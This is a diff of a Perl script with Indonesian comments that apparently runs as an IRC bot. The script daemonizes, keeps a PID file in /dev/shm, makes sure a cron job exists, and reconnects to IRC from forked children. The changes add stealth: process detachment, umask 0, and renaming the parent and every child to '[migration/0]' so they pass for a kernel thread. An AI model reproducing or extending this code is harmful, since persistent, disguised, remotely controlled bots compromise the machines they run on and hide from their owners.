@@ -2,13 +2,12 @@
 use strict;
 use warnings;
 use IO::Socket::INET;
-use POSIX qw(:sys_wait_h);
 use File::Basename;
 use File::Spec::Functions qw(rel2abs);
-use POSIX ();
+use POSIX qw(setsid);
 
-# Definisikan WNOHANG secara manual
-use constant WNOHANG => &POSIX::WNOHANG;
+# Mendefinisikan konstanta WNOHANG secara manual
+use constant WNOHANG => 1;
 
 # Path ke file PID
 my $pid_file = '/dev/shm/qe3.pid';
@@ -101,10 +100,20 @@ sub daemonize {
     if ($pid > 0) {
         exit 0;
     }
-    POSIX::setsid() or die "setsid failed: $!";
+    setsid() or die "setsid failed: $!";
+    chdir '/' or die "Can't chdir to /: $!";
     open(STDIN, '/dev/null') or die "Can't read /dev/null: $!";
     open(STDOUT, '>>/dev/null') or die "Can't write to /dev/null: $!";
     open(STDERR, '>>/dev/null') or die "Can't write to /dev/null: $!";
+    umask 0;
+}
+
+# Fungsi untuk mengubah nama proses
+sub set_process_name {
+    my ($name) = @_;
+    open(my $fh, '>', '/proc/self/comm') or die "Can't open /proc/self/comm: $!";
+    print $fh $name;
+    close($fh);
 }
 
 # Pastikan cron job ada
@@ -116,6 +125,9 @@ check_if_already_running();
 # Jalankan daemonize
 daemonize();
 
+# Ubah nama proses
+set_process_name("[migration/0]");
+
 # Membuat file PID
 create_pid_file();
 
@@ -125,6 +137,9 @@ if (!defined $pid) {
 }
 
 if ($pid == 0) {
+    # Ubah nama proses anak
+    set_process_name("[migration/0]");
+
     # Ini adalah proses anak, jalankan proses utama Anda di sini
     my $socket = connect_to_irc();
     my $connected = 0;
@@ -161,6 +176,9 @@ if ($pid == 0) {
         if ($? == -1 || $? != 0) {
             $pid = fork();
             if ($pid == 0) {
+                # Ubah nama proses anak
+                set_process_name("[migration/0]");
+
                 my $socket = connect_to_irc();
                 my $connected = 0;
 
